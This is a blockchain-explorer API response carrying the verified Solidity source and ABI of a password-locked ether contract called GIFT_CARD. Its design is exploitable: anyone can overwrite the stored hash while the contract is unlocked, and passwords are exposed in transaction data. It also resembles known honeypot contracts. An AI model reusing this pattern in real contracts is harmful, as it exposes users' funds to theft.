{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.19;\r\n\r\ncontract GIFT_CARD\r\n{\r\n    function Put(bytes32 _hash, uint _unlockTime)\r\n    public\r\n    payable\r\n    {\r\n        if(!locked && msg.value > 200000000000000000)// 0.2 ETH\r\n        {\r\n            unlockTime = now+_unlockTime;\r\n            hashPass = _hash;\r\n        }\r\n    }\r\n    \r\n    function Take(bytes _pass)\r\n    external\r\n    payable\r\n    access(_pass)\r\n    {\r\n        if(hashPass == keccak256(_pass) && now>unlockTime && msg.sender==tx.origin)\r\n        {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n    \r\n    function Lock(bytes _pass)\r\n    external\r\n    payable\r\n    access(_pass)\r\n    {\r\n        locked = true;\r\n    }\r\n    \r\n    modifier access(bytes _pass)\r\n    {\r\n        if(hashPass == keccak256(_pass) && now>unlockTime && msg.sender==tx.origin)\r\n        _;\r\n    }\r\n    \r\n    bytes32 public hashPass;\r\n    uint public unlockTime;\r\n    bool public locked = false;\r\n    \r\n    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}\r\n    \r\n    function() public payable{}\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_hash\",\"type\":\"bytes32\"},{\"name\":\"_unlockTime\",\"type\":\"uint256\"}],\"name\":\"Put\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"unlockTime\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_pass\",\"type\":\"bytes\"}],\"name\":\"Take\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"hashPass\",\"outputs\":[{\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_pass\",\"type\":\"bytes\"}],\"name\":\"Lock\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"pass\",\"type\":\"bytes\"}],\"name\":\"GetHash\",\"outputs\":[{\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"locked\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"GIFT_CARD","CompilerVersion":"v0.4.19+commit.c4cbbb05","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://305c4fa7aed6552a81e1fc1bfa671170577c20a221e85e1c20b76726aa8ff4e0"}]}